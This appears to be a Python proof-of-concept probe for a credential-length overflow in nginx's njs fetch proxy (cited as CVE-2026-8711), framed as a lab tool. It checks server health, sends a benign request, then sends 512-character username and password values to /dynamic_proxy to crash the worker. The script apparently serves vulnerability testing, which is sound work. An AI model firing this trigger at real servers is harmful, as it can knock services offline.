#!/usr/bin/env python3
"""Crash-only probe for the njs js_fetch_proxy credential overflow lab."""

from __future__ import annotations

import argparse
import http.client
import time
import urllib.parse


def parse_target(value: str, fallback_port: int) -> tuple[str, int]:
    if "://" in value:
        parsed = urllib.parse.urlparse(value)
        return parsed.hostname or "127.0.0.1", parsed.port or fallback_port
    if ":" in value.rsplit("@", 1)[-1]:
        host, port = value.rsplit(":", 1)
        return host, int(port)
    return value, fallback_port


def request(host: str, port: int, path: str, timeout: float = 5.0) -> tuple[int, bytes]:
    conn = http.client.HTTPConnection(host, port, timeout=timeout)
    try:
        conn.request("GET", path)
        resp = conn.getresponse()
        body = resp.read()
        return resp.status, body
    finally:
        conn.close()


def healthy(host: str, port: int) -> bool:
    try:
        status, body = request(host, port, "/", timeout=2.0)
        return status == 200 and b"njs fetch proxy lab ok" in body
    except Exception:
        return False


def dynamic_path(user: str, password: str) -> str:
    query = urllib.parse.urlencode({"u": user, "p": password})
    return f"/dynamic_proxy?{query}"


def main() -> int:
    parser = argparse.ArgumentParser(
        description="HTTP-only crash probe for CVE-2026-8711 lab builds."
    )
    parser.add_argument("--target", default="127.0.0.1:19411", help="HOST:PORT")
    parser.add_argument("--port", type=int, default=19411)
    parser.add_argument("--length", type=int, default=512, help="credential length to test")
    parser.add_argument("--post-delay", type=float, default=0.5)
    args = parser.parse_args()

    host, port = parse_target(args.target, args.port)
    print(f"target    {host}:{port}")
    print("scope     crash-only js_fetch_proxy credential overflow probe")
    print("primitive HTTP requests only; ASLR remains enabled")
    print()

    if not healthy(host, port):
        print("[!] target is not healthy before probe")
        return 2

    status, body = request(host, port, dynamic_path("testuser", "testpass"))
    print(f"benign    status={status} body={body[:80]!r}")
    if status != 200 or b"PROXY:" not in body:
        print("[!] benign ngx.fetch through proxy failed")
        return 2

    user = "A" * args.length
    password = "B" * args.length
    print(f"trigger   username={len(user)} password={len(password)}")
    try:
        status, body = request(host, port, dynamic_path(user, password), timeout=3.0)
        print(f"trigger   status={status} body_len={len(body)} sample={body[:80]!r}")
    except Exception as exc:
        print(f"trigger   exception={type(exc).__name__}: {exc}")

    time.sleep(args.post_delay)
    if healthy(host, port):
        print("health    target responded after trigger")
    else:
        print("health    target did not respond after trigger")

    print()
    print("note      inspect nginx/ASAN logs to classify worker crash vs fixed rejection")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
